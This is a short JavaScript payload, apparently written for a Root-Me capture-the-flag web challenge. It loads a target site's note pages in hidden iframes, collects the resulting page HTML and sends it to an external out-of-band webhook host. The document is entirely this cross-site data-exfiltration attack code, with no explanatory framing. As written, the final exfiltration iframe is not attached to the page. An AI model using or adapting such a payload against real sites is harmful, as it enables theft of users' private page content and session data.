<script>
const TARGET = "https://web-client-ch56.challenge01.root-me.org:58056/notes/";
const WEBHOOK = "https://525146614d396f3af709gux4rbeyyyyyb.oast.pro";

async function run(a = 0, b = 10) {
    const promises = [];

    for (let i = a; i < b; i++) {
        const iframe = document.createElement("iframe");
        iframe.src = TARGET + i;
        iframe.style.display = "none";
        document.documentElement.appendChild(iframe);

        const p = new Promise(resolve => {
            iframe.onload = () => resolve();
        });

        promises.push(p);
    }

    await Promise.all(promises);

    const data = encodeURIComponent(document.documentElement.outerHTML);
    
    const iframe = document.createElement("iframe");
    iframe.src = WEBHOOK + "?d=" + encodeURIComponent(data);        
}

run();
</script>
